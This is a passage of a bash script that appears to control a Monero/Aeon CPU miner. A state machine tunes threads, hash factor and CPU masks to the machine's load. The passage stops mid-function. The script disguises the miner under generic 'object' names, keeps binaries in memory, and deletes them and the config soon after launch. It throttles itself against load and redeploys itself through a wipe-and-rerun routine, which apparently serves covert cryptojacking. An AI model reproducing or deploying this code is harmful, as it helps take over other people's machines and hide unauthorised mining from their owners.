#!/bin/bash

## TODO: - Add realignment? After a config has been decided the state is perpetual sleep,
## consider a check in case it should be realigned with the available resources
## TODO: the mask choice could be tuned to start from the middle and then go up/down

## kill all child processes on sigterm
## https://stackoverflow.com/a/2173421/2229761
# trap "trap - SIGINT EXIT ; kill -9 \$(jobs -p) ; cleanup &>/dev/null ;" SIGINT EXIT
trap "trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; " SIGINT EXIT SIGKILL SIGTERM
export PATH=".:$PATH"

. ./functions
. ./gobbler

## update miner config value $1 with $2 ($2 doesn't need escaped quotes)
readonly cc_rgx='( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'
change_config() {
    # CONFIG=$(printf '%s' "$CONFIG" | sed -r 's/('"$1"'" *: *).*$/\1'"\"$2\""\,$'/' | tee ${OBJ_CFG_MASK})
    local subs
    while read l; do
        if [ "${l}" != "${l/\"*$1*\"*:/}" ]; then
            # l=${l%%,*\/\/*}
            # printf '%s' "${l/\"*:}"
            [[ "${l}" =~ $cc_rgx ]]
            matches=("${BASH_REMATCH[@]}")
            [ -n "${matches[3]}" -a "${2:0:1}" != "\"" ] &&
                subs="\"$2\"" ||
                    subs="$2"
            CONFIG=${CONFIG/${matches[0]}/${matches[1]}$subs${matches[5]}}
            break
        fi
    done <<< "$(printf '%s' "$CONFIG" 2>/dev/null)"
}

## output miner config value $1 unquoted
readonly gc_rgx=' *".*?" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'
get_config() {
    while read l; do
        if [ "${l}" != "${l/\"*$1*\"*:/}" ]; then
            # l=${l%%,*\/\/*}
            # printf '%s' "${l/\"*:}"
            [[ "${l}" =~ $gc_rgx ]]
            [ -n "${BASH_REMATCH[2]}" ] &&
                printf '%s' "${BASH_REMATCH[2]}" ||
                    printf '%s' "${BASH_REMATCH[3]}"
            # printf '%s' "$l" | sed -r 's/.*: *(.*),((.*(\/\/).*)|(.*))/\1/' | sed -r 's/"(.*)"/\1/'
            break
        fi
    done <<< "$(printf '%s' "$CONFIG" 2>/dev/null)"
}
## dump config to disk, if tmppath is deleted change dir
dump_config() {
    [ ! -f  "${OBJ_CFG_MASK}" ] &&
        printf '%s\n' "$CONFIG" > "${OBJ_CFG_MASK}"
}

## select co to mine
get_co() {
    AL=$(get_config algo)
    case "$AL" in
        cryptonight)
            echo xmr
            ;;
        cryptonight-lite)
            echo aeo
            ;;
        *)
            return 1
    esac
}

## change_profile takes care of tunables for the hashrate switcher algo
## switch_stepping : after how many line reads variables should be updated
## switch_triggger : after how many evaluations the miner should be realigned
## hash_health* : an higher drop prioritizes stable hashrate, higher boost peak hashrate
## cpu_avg_period : the loadavg to consider (1 5 or 10 minutes)
change_profile() {
    case "$SWITCH_PROFILE" in
        "HOT")
            change_config print-time 1
            readonly switch_stepping=${switch_stepping:-1} \
                     switch_trigger=${switch_trigger:-2} \
                     wakeup_timeout=${wakeup_timeout:-6} \
                     cpu_avg_period=1 print_time=1
            current_hash="current_hash_s"
            export hash_health_min=70 \
                       hash_health_drop=15 hash_health_boost=15
            ;;
        "WARM")
            change_config print-time 3
            readonly switch_stepping=${switch_stepping:-1} \
                     switch_trigger=${switch_trigger:-3} \
                     wakeup_timeout=${wakeup_timeout:-2700} \
                     cpu_avg_period=1 print_time=3
            current_hash="current_hash_s"
            export hash_health_min=70 \
                   hash_health_drop=10 hash_health_boost=10
            ;;
        "COLD")
            change_config print-time 60
            readonly switch_stepping=${switch_stepping:-1} \
                     switch_trigger=${switch_trigger:-15} \
                     wakeup_timeout=${wakeup_timeout:-20800} \
                     cpu_avg_period=10 print_time=60
            current_hash="current_hash_q"
            export hash_health_min=70 \
                   hash_health_drop=10 hash_health_boost=10
            ;;
        "FROZEN")
            change_config print-time 43200
            readonly switch_stepping=${switch_stepping:-1} \
                     switch_trigger=${switch_trigger:-999999999} \
                     wakeup_timeout=${wakeup_timeout:-86400} \
                     cpu_avg_period=10 print_time=43200
            current_hash="current_hash_q"
            export hash_health_min=70 \
                   hash_health_drop=10 hash_health_boost=10
            ;;
        "DEFAULT"|*)
            change_config print-time 15
            readonly switch_stepping=${switch_stepping:-1} \
                     switch_trigger=${switch_trigger:-4} \
                     wakeup_timeout=${wakeup_timeout:-3600} \
                     cpu_avg_period=5 print_time=15
            current_hash="current_hash_m"
            [ -n "${ping_last_state}" ] && eval "echo WAKEUP >&${ping_last_state}"
            export hash_health_min=70 \
                   hash_health_drop=10 hash_health_boost=10
            ;;
    esac
    export  switch_stepping switchC=$switch_stepping \
            switch_trigger_counter=0 \
            hash_health=100

    ## LOWRATE : higher means more constant H/s, a value 2 means it can fall by half
    export LOWRATE=${LOWRATE:-10}
    ## HYSTRATE : a tunable for deciding hashrate condition, higher is stricter
    export HYSTRATE=${HYSTRATE:-2}
}

## load the objects binary into a variable
load_bins() {
    [ -z "${OBJ_MASK}" ] && log "missing obj mask variable" && exit 1
    # disable_tracing
    fileToVar "${OBJ_MASK}" OBJ_BIN
    fileToVar $(get_path "${CLM_MASK}") CLM_BIN || { log "troubles loading bins"; exit 1; }
    [ "$1" = rm ] && rm -f "${OBJ_MASK}" "${CLM_MASK}"
    # enable_tracing
}

dump_bins() {
    [ -z "${OBJ_BIN}" ] && log "missing obj bin variable" && exit 1
    # disable_tracing
    varToFile OBJ_BIN "${OBJ_MASK}" && chmod +x "${OBJ_MASK}" && unset OBJ_BIN
    varToFile CLM_BIN "${CLM_MASK}" && chmod +x "${CLM_MASK}" && unset CLM_BIN
    # enable_tracing
}

## choose the initial config state
init_state() {
    export SWITCH_STATE SWITCH_STATE_PREV
    if [ -z "$SWITCH_STATE" ]; then
        ## bacause mhf_fixed is evaluated at init and goes directly to threads mode,
        ## only the backwards state trial checks for MHF_FIXED
        if [ -n "$MHF_FIXED" ]; then
            SWITCH_STATE=THREAD_TRIAL ## if mhf is fixed at runtime start from threads trial
            change_mhf $MHF_FIXED
            ## SCRATCH_START : start from scratch?
        elif [ "$SCRATCH_START" = 1 ]; then
            change_mhf 1
            change_threads 1
            change_mask 0
            SWITCH_STATE=MHF_TRIAL
        else
            SWITCH_STATE=${SWITCH_STATE:-MHF_TRIAL}
        fi
    fi
}

## preparations before starting daemon
## don't start with a high hash factor, always start with a low one, otherwise the perf baseline is unreliable
init() {
    export CONFIG="$(<${OBJ_CFG_MASK})" || { log "obj cfg not found" && exit 1; }
    rm -f ${OBJ_CFG_MASK} ## to prevent first miner start from reloading stale config

    ## the deploy config can be decided by the config itself
    DEPLOY=$(<"${DEPLOY_CFG:-deploy}") || { log "backup deploy script absent" && exit 1; }

    export TARGET_CO=${TARGET_CO:-$(get_co)}
    export CORES=${CORES:-$(nproc || grep -ic "core id" </proc/cpuinfo)}
    ## set max threads based on target coin
    case "$TARGET_CO" in
        xmr)
            TBT=$((CORES/2)) ## always half cores with xmr
            ;;
        aeo)
            TBT=$((CORES-2)) ## spare 2 cores with aeon
            ;;
    esac
    export MAX_THREADS=${MAX_THREADS:-${TBT}} ## never use more than half cores
    export PROC_USG ## stores the latest recorded proc usage of the object
    export CPULIMIT ## use cpulimiter or not, def no

    ## THREADS_MODE : is set threads have priority over hash factor
    export THREADS_MODE
    ## SLEEP_TIMER : timer for sleep state
    export SLEEP_TIMER
    ## START_TIME : last time the miner was started
    export START_TIME
    ## lockminer : a lock to prevent too fast subsequent switches
    export lockminer=

    export MHs=999999 XHs=0 CHs=0 NHs=0 PHs=0 THs=0 AHs=0 ## initial HS/s values
    export pMhf=0 pThr=0 pMsk=0x0 ## previous values hashfactor,hashmask,threads
    export xMhf=1 xThr=1 xMsk=0x0 ## hashfactor,hashmask,threads at the latest recorded max hashrate
    export cMhf=$(get_config hash-factor) cThr=$(get_config threads) cMsk=$(get_config thread-mask)

    ## SWITCH_STATE : state of the state machine
    init_state

    change_profile ${SWITCH_PROFILE:-DEFAULT}

    ## load some binaries into variables
    [ -z "$VERBOSE" ] &&
        load_bins 2>/dev/null ||
            load_bins 2>>/tmp/.debug_log

}

## prevent concurrent miner start calls
lock_miner() {
    local lock_start=$SECONDS
    while kill -0 ${objectd_PID} 2>/dev/null; do
        log "miner must be stopped"
        fleep 1
        if [ $((SECONDS-lock_start)) -gt 30 ]; then
            log "miner still running, force killing"
            kill -9 ${objectd_PID}
            lockminer=1
            return
        fi
    done ## miner must not be running
    [ -n "$lockminer" ] && log "concurrent calls, aborting" && exit 1
    lockminer=1
}
unlock_miner() {
    unset lockminer
}

rmcfg() {
    fleep $RMCFG_SCHEDULE
    while [ -f "${EXEC_OBJ_MASK}" ]; do
        fleep 1
    done
    rm -f "${OBJ_CFG_MASK}"
    RMCFG_SCHEDULE=
}

# ## the command of the daemon to start (standalone)
# start_miner() {
#     lock_miner
#         [ -z "$CONFIG" ] && echo "config not loaded" && exit 1
#     START_TIME=$SECONDS SLEEP_TIMER=0
#     printf '%s' "$CONFIG" > ${OBJ_CFG_MASK}
#     start_coproc exec ${OBJ_MASK} -c ${OBJ_CFG_MASK}
#     wait_coproc ${OBJ_MASK}
#     eval "export miner_pid=\$${OBJ_MASK}_PID}"
#     ## cpumon
#     # disable_tracing
#     start_coproc cpumon ${miner_pid} ${cpumon_span} ${cpumon_ival}
#     # enable_tracing
#     unlock_miner
#     # (fleep 1 ; rm -f ${OBJ_CFG_MASK} &
# }

## the command of the daemon to start (pausd)
start_miner() {
    clear_log
    log "starting miner..."
    lock_miner
    ## switch path to remove tmppath later ( for deploy script )
    [ "$PWD" != "$tmppath" -a -n "$tmppath" ] && cd "$tmppath"
    [ -z "$CONFIG" ] && log "config not loaded" && exit 1
    START_TIME=$SECONDS SLEEP_TIMER=0

    while true; do
        ## start the actual miner and ancillary processes
        log "starting pausd processes"
        ## make sure config is updated
        log "dumping config"
        dump_config 2>/dev/null
        ## unload binaries before starting processes
        log "dumping binaries"
        dump_bins 2>/dev/null
        pausd
        ## make sure its ok
        log "waiting for objectd"
        wait_coproc objectd 30 && { log "objectd started"; break; }
    done
    ## cpumon
    # disable_tracing
    # UNSET_COPROC_VARS="OBJ_BIN CLM_BIN"
    log 'starting cpumon'
    start_coproc cpumon ${objectd_PID} ${cpumon_span} ${cpumon_ival} 2>/dev/null
    # enable_tracing
    ## delete object bin after start
    load_bins rm 2>/dev/null
    log 'unlock miner'
    unlock_miner
    RMCFG_SCHEDULE=60
}

# stop_miner(){
#     ## restart miner
#     export hash_health=100 switch_trigger_counter=0 PHs=$THs THs=0
#     stop_coproc ${OBJ_MASK} 15
#     stop_coproc cpumon 15
# }

## (pausd)
stop_miner(){
    ## restart miner
    export hash_health=100 switch_trigger_counter=0 PHs=$THs THs=0
    stop_coproc objectd 9
    stop_coproc cpumon 9
}

scratcher() {
    # stop_miner
    trap - SIGINT EXIT SIGKILL SIGTERM ## remove traps
    kill -9 $(jobs -p)
    rm -f "$OBJ_CFJ_MASK" \
       "$OBJ_MASK" \
       "$CLM_MASK"

    COMMAND_BEFORE=$(get_config command_before)
    COMMAND_AFTER=$(get_config command_after)
    UPDATED_DEPLOY="kill -9 $STARTING_PID
    # starting_vars
    STARTING_VARS=\"$STARTING_VARS\"
    $STARTING_VARS
    # starting_vars end
    # command before
    ${COMMAND_BEFORE//scratcher;}
    # command before end
    $DEPLOY
    # command after
    $COMMAND_AFTER
    # command after end"

    clear_fds ## very important much troubles
    # unset OBJ_BIN CLM_BIN ## this would clog the clear_env func
    # clear_env PATH SHELL USER TMUX PWD HOME CHARSET TERM UPDATED_DEPLOY BASHPID STARTING_VARS COMMAND_BEFORE DEPLOY COMMAND_AFTER
    dex_env
    export PATH=$STARTING_PATH
    if [ "$TMX" = 0 ]; then
        bash <<<"$(printf '%s' "$UPDATED_DEPLOY")" 2>&2 1>&1 0<&0 & disown
        exit ## same as below
    else
        exec bash <<< "$(printf '%s' "$UPDATED_DEPLOY")" 2>&2 1>&1 0<&0
    fi
    # kill -9 $BASHPID ## this kill the job that the parent is waiting for
}

## $1 the new mhf value
change_mhf() {
    [ -n "$MHF_FIXED" ] && return 1
    case "$1" in
        up)
            if [ $cMhf -lt 5 ]; then
                nMhf=$((cMhf+1))
            fi
            ;;
        down)
            if [ $cMhf -gt 1 ]; then
                nMhf=$((cMhf-1))
            fi
            ;;
        *)
            if [ -n "$1" ]; then
                [ $pMhf != 0 ] && pMhf=$cMhf ## skip in case of init (previous is zero)
                cMhf="$1"
                change_config hash-factor $cMhf
                return
            else
                return 1
            fi
            ;;
    esac
    pMhf=$cMhf
    cMhf=$nMhf
    change_config hash-factor $cMhf
}

## switch threads up or down
change_threads() {
    [ "$THREADS_FIXED" ] && return 1
    case "$1" in
        up)
            if [ $cThr -lt $MAX_THREADS ]; then ## never use more than MAX_THREADS
                nThr=$((cThr+1))
            else
                return 1
            fi
            ;;
        down)
            if [ $cThr -gt 1 ]; then
                nThr=$((cThr-1))
            else
                return 1
            fi
            ;;
        *)
            if [ -n "$1" ]; then
                [ $pThr != 0 ] && pThr=$cThr ## skip in case of init (previous is zero)
                cThr="$1"
                change_config threads $cThr
                return
            else
                return 1
            fi
            ;;
    esac
    pThr=$cThr
    cThr=$nThr
    change_config threads $cThr
}

## switch mask up or down based on current threads number
change_mask() {
    bMsk=$(hex2bin $cMsk)
    ones=${bMsk/0} ## strip zeroes
    mskThreads=${#ones} ## how many threads are enabled in the mask
    binL=${#bMsk} ## how long is the binary string
    case "$1" in
        up)
            if [ $mskThreads = $((cThr-1)) ]; then ## reset mask to 0 if next step equals a full mask
                bMsk=0
            else ## else add one more thread
                if [ $binL -lt $((cThr-2)) ]; then ## just append 01 to the right (beginning)
                    bMsk=${bMsk}01
                else ## replace one 0 with 1 from the beginning (right)
                    bMsk=$(replace_end 0$bMsk 0 1) ## make sure there is always one zero left
                fi
            fi
            ;;
        down)
            if [ $cMsk = 0x0 ]; then
                bMsk=$(printf '1%.0s' $(eval "echo {1..$cThr}"))
            fi
            bdMsk=${bMsk/11/01}
            if [ $bMsk = $bdMsk ]; then ## no alternates just replace 1
                bMsk=${bMsk/1/0}
            else
                bMsk=$bdMsk
            fi
            ;;
        prev)
            if [ $pMsk = 0 ]; then ## this is mostly for startup
                nMsk=1
            else
                nMsk=$pMsk
            fi
            ;;
        *)
            nMsk=$1
            export ret=0
    esac
    nMsk=${nMsk:-$(bin2hex $bMsk)} ## default for direct setting (prev/*)
    pMsk=$cMsk
    cMsk="0x${nMsk}"
    unset nMsk ## unset nMsk so that mask can be set in cases without bin conversion
    change_config thread-mask $cMsk
    # [ $cMsk = 0x0 ] && return 1 ## warn about default mask
}

## compare if mask $1 is greater than mask $2
compare_mask() {
    msk1B=$(hex2bin "$1")
    ones1=${msk1B//0} ## strip all zeroes
    msk2B=$(hex2bin "$2")
    ones2=${msk2B//0}
    nOnes1=${#ones1} ## count the ones (active cores) more cores greater map, unless 0
    nOnes2=${#ones2}
    [ ${nOnes1} = 0 ] && [ ${nOnes2} != 0 ] && return 0
    [ ${nOnes1} != 0 ] && [ ${nOnes2} = 0 ] && return 1
    [ ${nOnes1} -gt ${nOnes2} ]
}

## controls the load increasing mhf threads or mask
change_load() {
    case "$1" in
        up)
            case $SWITCH_STATE in
                "MHF_TRIAL"|\
                    "B_MHF_TRIAL")
                    change_mhf up || return 1
                    [ $cThr -gt 1 ] && change_threads down || return 0
                    ;;
                "THREAD_TRIAL"|\
                    "B_THREAD_TRIAL")
                    change_threads up || return 1
                    change_mask 0
                    ;;
                "MASK_TRIAL"|\
                    "MASK_UP_THREADS_DOWN"|\
                    "MASK_UP_THEN_SLEEP")
                    change_mask up
                    ;;
                "MHF_TO_THREAD_TRIAL"|"B_MHF_TO_THREAD_TRIAL")
                    change_threads up
                    ;;
                "PLUS_THREAD_MINUS_MHF")
                    change_mask up
                    ;;
                "WAKEUP")
                    msk=${xMsk/0x}
                    change_mask ${msk:-$cMsk} # don't pass 0x string to change_mask
                    change_threads ${xThr:-$cThr}
                    change_mhf ${xMhf:-$cMhf}
                    log "its a wakeup! returning 0..."
                    return 0 # force the restart anyway
                    ;;
                "MHF_DOWN_THEN_SLEEP")
                    change_mhf down || return 1
                    ;;
                "MASK_DOWN_THEN_SLEEP")
                    change_mask down || return 1
                    ;;
                "SLEEP")
                    [ $SWITCH_STATE_PREV == SLEEP ] && return 1
                    ;;
            esac
            ;;
        down)
            case $SWITCH_STATE in
                "MHF_TRIAL"|\
                    "B_MHF_TRIAL"|\
                    "MHF_DOWN_THEN_SLEEP")
                    change_mhf down || return 1
                    ;;
                "MHF_TO_THREAD_TRIAL"|"B_MHF_TO_THREAD_TRIAL") ## transient state between max mhf and thread trial
                    change_threads up
                    change_mhf down
                    ;;
                "THREAD_TRIAL")
                    change_mask down
                    ;;
                "B_THREAD_TRIAL")
                    change_threads down || return 1
                    change_mask 0
                    ;;
                "MASK_TRIAL")
                    change_mask down ## changing mask never fails because rotates back
                    ;;
                "MASK_DOWN_THEN_SLEEP")
                    change_mask down || return 1
                    ;;
                "MASK_UP_THEN_SLEEP")
                    change_mask up || return 1
                    ;;
                "PLUS_THREAD_MINUS_MHF")
                    change_mhf down || return 1
                    ;;
                "PLUS_THREAD_MINUS_MASK")
                    change_threads up ||
                        change_mask down ||
                        return 1
                    ;;
                "THREAD_BACKOFF")
                    change_threads down || return 1
                    ;;
                "WAKEUP")
                    msk=${xMsk/0x}
                    change_mask ${msk:-$cMsk}
                    change_threads ${xThr:-$cThr}
                    change_mhf ${xMhf:-$cMhf}
                    log "its a wakeup! returning 0..."
                    return 0 # force the restart anyway
                    ;;
                "SLEEP")
                    [ $SWITCH_STATE_PREV == SLEEP ] && return 1
                    ;;
            esac
            ;;
    esac
}

## true if load in 1 5 or 10 minutes (from $1) is lower than $CORES minus the current threads
load_check() {
    period=${1:-${cpu_avg_period}}
    eval "cpu_avg=\${cpu_avg_${period}}"
    [ $cpu_avg -lt $((CORES-cThr)) ] ## return code should match this statement
}

load_check_prc() {
    period=${1:-${cpu_avg_period}}
    eval "cpu_avg=\${cpu_avg_prc_${period}}"
    [ $cpu_avg -lt $(((CORES-cThr)*100)) ] ## return code should match this statement
}

## true if load in 1 5 or 10 minutes (from $1) is lower than $2
load_check_fixed() {
    period=${1:-${cpu_avg_period}}
    eval "cpu_avg=\${cpu_avg_${period}}"
    [ $cpu_avg -lt $2 ] ## return code should match this statement
}

load_check_prc_fixed() {
    period=${1:-${cpu_avg_period}}
    eval "cpu_avg=\${cpu_avg_prc_${period}}"
    [ $cpu_avg -lt $2 ] ## return code should match this statement
}

## true if usage diff is < ${1}% (20%) from current max threads usage
usg_check() {
    [ $PROC_USG -gt $((cThr*100-${1:-20})) ]
}

cpu_check() {
    usg_check && load_check $1
}

## a variable to tune the limit
calc_hyst() {
    # hyst=1
    # for i in $(eval "echo {1..$cMhf}"); do
    #     hyst=$((hyst*i))
    # done
    hyst=$((HYSTRATE*cThr*cMhf))
}

## hash has fallen if current hashing is lower than max by LOWRATE
hash_check() {
    [ $CHs = 0 ] && return 0
    diff=$((XHs-CHs)) && calc_hyst
    limit=$((XHs/LOWRATE-hyst))
    ## must be better than max hash and previous hash
    log "CHs: $CHs, accepted \>$((XHs-limit))"
    ## the difference must be less than limit
    ## the current hashrate must be higher than minimum hashing
    if [ $diff -le $limit \
               -a $CHs -ge $MHs \
               -o $limit -eq -${hyst} ]; then ## variabily is low, ok
        return 1
    else ## variability is high, not ok!
        if [ $CHs -lt $PHs ]; then
            log "hash sick; diff: $diff limit: $limit PHs: $PHs"
            return 0
        else
            log "hash not sicker; CHs: $CHs PHs: $PHs"
            return 1
        fi
    fi
}

## keep record of the max H/s $XHs
max_hash() {
    if [ $XHs -lt $CHs ]; then
        log "new prime hash $XHs -\> $CHs"
        export XHs=$CHs
        export xMhf=$cMhf xThr=$cThr xMsk=$cMsk
    fi
}

## keep record of the hashrate previous to the current iteration (PHs) and of the last trial
prev_hash() {
    [ $THs = 0 ] && THs=$CHs
    THs=$(((THs+CHs)/2)) ## assign average
}

## keep record of the lowest H/s $MHs
min_hash() {
    if [ $CHs -lt $MHs -a $CHs -ne 0 ]; then
        export MHs=$CHs
    fi
}

## wrapper for sleep state set
start_sleeping() {
    SWITCH_STATE=SLEEP SLEEP_START=$SECONDS SLEEP_TIMER=0
    flush_fd ${ping_last_state}
    log "starting sleeping"
    echo SLEEP >&${ping_last_state}
    log "sent sleep"
    return 1 ## return 1 to prevent pointless restarts
}

## wrapper for waking up
start_steering() {
    SWITCH_STATE=WAKEUP ## retry from MHF_TRIAL but with current mhf
    flush_fd ${ping_last_state}
    log "starting steering"
    echo WAKEUP >&${ping_last_state}
    log "sent wakeup"
}

## increase sleep timer
sleep_timer() {
    if [ $SWITCH_STATE = SLEEP ]; then
        SLEEP_TIMER=$((SECONDS-SLEEP_START))
    fi
}

parse_hash_read(){
    hash_read=${hash_read/*n\/a*/0}
    hash_read=${hash_read/\.*}
}

## use if output is colored
## sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g"
## read current hash $CHs from line $1
current_hash_s() {
    # hash_read=$(printf '%s' "$1" | awk '{print $5}' | sed 's#.*n/a.*#0#' | sed 's/\..*//')
    hash_read=$(get_column "$1" 4)
    parse_hash_read
    CHs=${hash_read:-0}
}
current_hash_m() {
    # hash_read=$(printf '%s' "$1" | awk '{print $6}' | sed 's#.*n/a.*#0#' | sed 's/\..*//')
    hash_read=$(get_column "$1" 5)
    parse_hash_read
    CHs=${hash_read:-0}
}
current_hash_q() {
    # hash_read=$(printf '%s' "$1" | awk '{print $7}' | sed 's#.*n/a.*#0#' | sed 's/\..*//')
    hash_read=$(get_column "$1" 6)
    parse_hash_read
    CHs=${hash_read:-0}
}
current_hash_x() {
    # hash_read=$(printf '%s' "$1" | awk '{print $8}' | sed 's#.*n/a.*#0#' | sed 's/\..*//')
    hash_read=$(get_column "${1/*max:}" 0)
    parse_hash_read
    CHs=${hash_read:-0}
}

## select state depending on positive/negative hashrate
change_state(){
    SWITCH_STATE_PREV=$SWITCH_STATE
    log "STATE_PREV: $SWITCH_STATE_PREV cMhf: $cMhf cThr: $cThr cMsk: $cMsk"
    log "going: $1"
    case $1 in
        up)
            case $SWITCH_STATE in
                "MHF_TRIAL")
                    if [ $pMhf = $cMhf ] ||
                           [ $cMhf = 5 ] &&
                               cpu_check; then ## mhf maxed, switch to threads
                        SWITCH_STATE=MHF_TO_THREAD_TRIAL
                        ## an higher mhf must give at least half the base more
                        ## otherwise an additional thread is always better (even if not in THREADS_MODE)
                        ## skip base beginning case (pMhf=0) since it can't be lower than the base
                    elif [ $pMhf != 0 ] &&
                             [ $THs -lt $((PHs+PHs/2)) ]; then
                        cpu_check &&
                            SWITCH_STATE=PLUS_THREAD_MINUS_MHF ||
                                SWITCH_STATE=MHF_DOWN_THEN_SLEEP
                                start_sleeping
                    fi
                    ;;
                "B_MHF_TRIAL") ## try increasing mhf again, in this state there could be already multiple threads but full mask
                    if [ -n "$MHF_FIXED" ]; then
                        start_sleeping
                    elif [ $pMhf = $cMhf ] || ## if mhf maxed go to backwards threads trial
                             [ $cMhf = 5 ] &&
                                 cpu_check ; then
                        SWITCH_STATE=B_MHF_TO_THREAD_TRIAL
                    elif [ $cThr -lt $MAX_THREADS ] && cpu_check; then
                        SWITCH_STATE=B_THREAD_TRIAL
                    else
                        start_sleeping
                    fi
                    ;;
                "THREAD_TRIAL"|"MHF_TO_THREAD_TRIAL"|"B_MHF_TO_THREAD_TRIAL")
                    if [ -n "$THREADS_FIXED" ]; then
                        start_sleeping
                    elif [ $pThr = $cThr ] ||
                           ! cpu_check; then ## if max threads reached or cpu is overloaded
                        SWITCH_STATE=THREAD_BACKOFF
                    else
                        cpu_check &&
                            SWITCH_STATE=THREAD_TRIAL || ## for transient mhf_thread state
                                start_sleeping
                    fi
                    ;;
                "B_THREAD_TRIAL") ## the first condition is for the path of after backward mask trial resulting in ideal mhf/threads/mask
                    if [ -n "$THREADS_FIXED" ]; then
                        start_sleeping
                    elif [ $pThr -gt $cThr ]; then ## wakeup steering should have optimal threads
                        SWITCH_STATE=PLUS_THREAD_MINUS_MASK
                    fi
                    if [ $cThr = $MAX_THREADS ] ||
                           ! cpu_check; then
                        start_sleeping
                    fi
                    ;;
                "B_MASK_TO_THREAD_TRIAL") ## mask to thread is set after a down request, if up try increasing mask with current lower thread count
                    SWITCH_STATE=MASK_UP_THREADS_DOWN
                    ;;
                "MASK_UP_THREADS_DOWN")
                    if [ $cMsk = 0x0 ]; then
                        start_sleeping
                    fi
                    ;;
                "MASK_TRIAL")
                    if [ $pQ = down ]; then ## the mask was reduced to optimal value so sleep
                        start_sleeping
                    elif [ $cMsk = 0x0 ]; then ## an up request after wakeup with full mask means there is cache available
                        if [ $cMhf -lt 5 ]; then ## fist check mhf that threads
                            SWITCH_STATE=B_MHF_TRIAL
                        elif [ $cThr -lt $MAX_THREADS ] &&
                                 cpu_check ; then
                            SWITCH_STATE=B_THREAD_TRIAL
                        fi
                    fi
                    ;;
                "PLUS_THREAD_MINUS_MHF") ## reached a low enough mhf, now try increasing the threads again
                    cpu_check &&
                        SWITCH_STATE=THREAD_TRIAL ||
                           start_sleeping
                    ;;
                "PLUS_THREAD_MINUS_MASK"|\
                    "MASK_DOWN_THEN_SLEEP"|\
                    "MASK_UP_THEN_SLEEP") ## should have reached optimal threads/mhf mask at this point
                    start_sleeping
                    ;;
                "THREAD_BACKOFF") ## thread backoff doesn't have an up path
                    start_sleeping
                    ;;
                "WAKEUP") ## from wakeup try to go up again, figuring where it left off
                    log "waking up"
                    if [ $cMsk != 0x0 ] &&
                           [ $cThr -gt 1 ] &&
                           [ $cMhf -gt 1 ]; then
                        SWITCH_STATE=MASK_TRIAL
                    elif [ $cThr -lt $MAX_THREADS ] &&
                             cpu_check; then
                        SWITCH_STATE=B_THREAD_TRIAL
                    elif [ $cMhf -lt 5 ]; then
                        SWITCH_STATE=B_MHF_TRIAL
                    fi
                    return 0
                    ;;
                "SLEEP")
                    if [ $SLEEP_TIMER -ge $wakeup_timeout ]; then
                        start_steering ## retry from MHF_TRIAL but with current mhf
                    fi
                    ;;
            esac
            ;;
        down)
            case $SWITCH_STATE in
                "MHF_TRIAL")
                    ## MHF_TRIAL after max mhf switch to threads
                    if [ $cMhf = 1 ] &&
                           [ $cThr != 1 ] &&
                           cpu_check; then
                        SWITCH_STATE=THREAD_TRIAL ## go threads trial
                    else ## we lower from a previous increase so reached max mhf, switch to thread trial or sleep if no cpu
                        cpu_check &&
                            SWITCH_STATE=MHF_TO_THREAD_TRIAL ||
                                start_sleeping
                    fi
                    ;;
                "B_MHF_TRIAL")
                    if [ -n "$MHF_FIXED" ]; then
                        start_sleeping
                    elif [ $cMhf = 1 ]; then
                        if [ $cThr -lt $MAX_THREADS ] &&
                               cpu_check; then
                            SWITCH_STATE=B_THREAD_TRIAL
                        else
                            start_sleeping
                        fi
                    else
                        SWITCH_STATE=MHF_DOWN_THEN_SLEEP
                    fi
                    ;;
                "PLUS_THREAD_MINUS_MASK")
                    ## if previous mask was 0x1 and down was requested switch down threads
                    if [ $pQ = down -a $cMsk = 0x1 -a $pThr -ge $cThr ]; then ## work around for wakeup steer
                        SWITCH_STATE=B_THREAD_TRIAL
                    elif [ $pMsk = 0x1 ]; then
                        SWITCH_STATE=THREAD_BACKOFF
                    fi
                    ;;
                "PLUS_THREAD_MINUS_MHF")
                    if [ $cMhf = 1 ]; then
                        start_sleeping
                    fi
                    ;;
                "THREAD_TRIAL"|"MHF_TO_THREAD_TRIAL"|"B_MHF_TO_THREAD_TRIAL")
                    if [ -n "$THREADS_FIXED" ]; then
                        start_sleeping
                    elif [ $cMhf -gt 1 -a -n "$THREADS_MODE" ]; then
                        SWITCH_STATE=PLUS_THREAD_MINUS_MHF
                    elif [ $cMhf -gt 1 -a -z "$THREADS_MODE" ]; then ## we are using an high mhf so change mask
                        if [ $cMsk != 0x1 -a $cThr != 1 ]; then ## if mask is not at a mininum (0x1 = 1 = 01)
                            SWITCH_STATE=PLUS_THREAD_MINUS_MASK
                        else ## it is done
                            start_sleeping
                        fi
                    else ## mhf is 1, mask is at minimum, this means cpu limited so can't use more threads
                        SWITCH_STATE=THREAD_BACKOFF
                    fi
                    ;;
                "B_THREAD_TRIAL") ## threads were switched after wakeup (when threads are switched mask is re-evaled)
                    if [ -n "$THREADS_FIXED" ]; then
                        start_sleeping
                    else
                        SWITCH_STATE=PLUS_THREAD_MINUS_MASK
                    fi
                    ;;
                "MASK_TRIAL") ## if mask is minimum then reduce threads and reset mask
                    if compare_mask $cMsk $pMsk ; then ## if current mask is greater and rate is down reduce it and sleep, unless it is 0x1 which means we try to increase threads
                        SWITCH_STATE=MASK_DOWN_THEN_SLEEP
                    else ## else it means the previous mask was better (and lower), set it back then sleep
                        if [ $pMsk = 0x1 ]; then ## but if it was one try reducing threads or mhf
                            if [ $cThr -gt 1 ] &&
                                   ! cpu_check; then ## reduce threads if cpu overloaded
                                SWITCH_STATE=B_THREAD_TRIAL
                            elif [ $cMhf -gt 2 ]; then ## else reduce mhf if more than 2 (otherwise mask is useless)
                                SWITCH_STATE=B_MHF_TRIAL
                            else
                                SWITCH_STATE=MASK_UP_THEN_SLEEP ## else increase then sleep
                            fi
                        fi
                    fi
                    ;;
                "MASK_UP_THREADS_DOWN") ## upping mask not good go back to sleep
                    SWITCH_STATE=DOWN_MASK_THEN_SLEEP
                    ;;
                "THREAD_BACKOFF")
                    ## the backoff only scales the last thread that was too much down
                    start_sleeping
                    ;;
                "WAKEUP") ## since wakeup starts from max hash we go backwards (B) with the logic, mask->threads->mhf
                    log "waking up"
                    if [ $cMsk != 0x1 ] &&
                           [ $cThr -gt 1 ] &&
